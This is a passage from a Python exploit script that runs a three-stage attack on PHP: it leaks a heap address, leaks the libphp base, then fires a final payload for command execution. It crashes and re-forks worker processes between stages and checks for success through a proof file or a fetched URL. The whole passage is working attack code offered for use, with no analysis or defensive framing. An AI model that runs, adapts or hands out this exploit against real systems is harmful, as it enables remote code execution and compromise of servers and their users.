            t.log(f"[+] chunk base = 0x{chunk:x}")
            break
        t.log("[-] heap leak missed")
        rotate_after_failure()
    if not chunk:
        print("HEAP_LEAK_FAILED", file=sys.stderr)
        return 1
    # each stage needs a fresh worker; one crash + fork is not always enough on
    # slow hosts, so rotate twice and let prefork settle
    ex.rotate(); time.sleep(1.0)
    ex.rotate(); time.sleep(1.5)

    # ---- stage 2 ----
    libphp = 0
    for attempt in range(1, args.retries + 1):
        t.log(f"[*] stage 2: libphp leak (attempt {attempt}/{args.retries})")
        libphp = ex.stage2()
        if libphp:
            t.log(f"[+] libphp base = 0x{libphp:x}")
            break
        t.log("[-] libphp leak missed")
        rotate_after_failure()
    if not libphp:
        print("LIBPHP_LEAK_FAILED", file=sys.stderr)
        return 1
    ex.rotate(); time.sleep(1.5)

    # ---- stage 3 ----
    htdata = chunk + args.htdata_offset
    zif = libphp + args.zif_offset
    t.log(f"[*] stage 3: HTDATA=0x{htdata:x} ZIF=0x{zif:x}")
    proof = ""
    if args.proof_file:
        try:
            if os.path.exists(args.proof_file):
                os.unlink(args.proof_file)
        except OSError:
            pass

    for attempt in range(1, args.retries + 3):
        try:
            ex.stage3(htdata, zif)
        except OSError as e:
            t.log(f"[-] request error: {e}")
        time.sleep(0.8)

        if args.proof_file:
            try:
                if os.path.exists(args.proof_file):
                    with open(args.proof_file, "rb") as f:
                        proof = f.read().decode("latin1").strip()
            except OSError:
                pass
        if not proof and args.fetch:
            status, body = t.get(args.fetch)
            if status == 200:
                proof = body.decode("latin1").strip()
        if proof:
            t.log(f"[+] W3 attempt {attempt}")
            print(f"PROOF: {proof}")
            return 0
        t.log(f"[-] stage 3 attempt {attempt} no proof yet")
        rotate_after_failure()

    print("EXPLOIT_FAILED (no proof; the command may still have executed blind)",
          file=sys.stderr)
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
